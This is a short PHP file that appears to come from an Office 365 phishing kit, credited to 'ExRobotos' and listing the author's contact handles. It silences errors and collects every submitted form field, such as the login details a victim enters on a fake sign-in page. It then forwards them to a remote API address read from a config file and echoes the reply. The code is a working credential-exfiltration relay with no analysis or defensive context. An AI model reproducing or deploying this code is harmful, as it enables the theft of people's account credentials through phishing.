<?php
/* 
OFF365 V4 2020 by ExRobotos
Email: ex.robotos.official@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: @Ex.Robotos
*/
error_reporting(0);include('config.php');$apiurl.='?';foreach($_POST as $a=>$b){$apiurl.=urlencode($a).'='.urlencode($b).'&';}if(in_array  ('curl', get_loaded_extensions())) {$ExRobotos=curl_init();curl_setopt($ExRobotos,CURLOPT_URL,$apiurl);curl_setopt($ExRobotos,CURLOPT_HEADER,0);curl_setopt($ExRobotos,CURLOPT_RETURNTRANSFER,TRUE);$curlExec=curl_exec($ExRobotos);curl_close($ExRobotos);echo $curlExec;}else{$result = file_get_contents($apiurl);echo $result;}
?>